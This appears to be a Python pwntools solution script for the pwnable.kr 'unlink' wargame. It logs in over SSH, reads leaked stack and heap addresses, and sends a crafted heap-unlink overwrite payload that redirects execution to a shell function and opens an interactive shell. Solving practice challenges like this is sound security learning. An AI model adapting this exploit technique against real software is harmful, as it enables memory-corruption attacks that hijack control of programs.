from pwn import *

pro = ssh("unlink", "pwnable.kr", password="guest", port=2222)
r = pro.process("./unlink")
#r = process('./unlink')

print util.proc.pidof(r)
#pause()


shell_address = p32(0x80484eb)
r.recvuntil("stack address leak: ")
stack_address = r.recvuntil("\n")
print "Stack leak: ", stack_address
r.recvuntil("heap address leak: ")
heap_address = r.recvuntil("\n")
print "Heap leak: ", heap_address
r.recvuntil("get shell!\n")
r.sendline(shell_address + "A"*12 + p32(int(stack_address, 16) + 12) + p32(int(heap_address, 16) + 8 + 4))
r.interactive()
